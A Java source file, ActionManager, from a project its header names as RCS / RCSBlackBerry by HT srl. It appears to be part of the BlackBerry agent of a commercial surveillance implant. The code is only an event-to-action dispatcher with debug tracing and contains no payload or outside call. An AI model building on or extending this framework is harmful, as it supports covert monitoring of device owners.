//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.manager;

import blackberry.Singleton;
import blackberry.action.Action;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.event.Event;
import blackberry.interfaces.iSingleton;

public class ActionManager extends Manager implements iSingleton {
    private static final long GUID = 0xfa169723286585c3L;

    /** The debug instance. */
    //#ifdef DEBUG
    static Debug debug = new Debug("ActionManager", DebugLevel.VERBOSE);
    //#endif

    /** The instance. */
    static ActionManager instance = null;

    /**
     * Gets the single instance of AgentManager.
     * 
     * @return single instance of AgentManager
     */
    public static synchronized ActionManager getInstance() {
        if (instance == null) {
            instance = (ActionManager) Singleton.self().get(GUID);
            if (instance == null) {
                final ActionManager singleton = new ActionManager();
                Singleton.self().put(GUID, singleton);
                instance = singleton;
            }
        }

        return instance;
    }

    /**
     * Trigger action.
     * 
     * @param actionId
     *            the action id
     * @param event
     *            the event
     * @return true, if successful
     */
    public synchronized boolean triggerAction(final int actionId,
            final Event event) {
        //#ifdef DEBUG
        debug.trace("TriggerAction:" + actionId);
        //#endif

        if (actionId != Action.ACTION_NULL) {
            final Action action = get(actionId);
            action.trigger(event);
            return true;
        } else {
            //#ifdef DEBUG
            debug.error("TriggerAction FAILED " + actionId);
            //#endif
            return false;
        }
    }

    private Action get(int actionId) {
        return (Action) get(Integer.toString(actionId));
    }

}
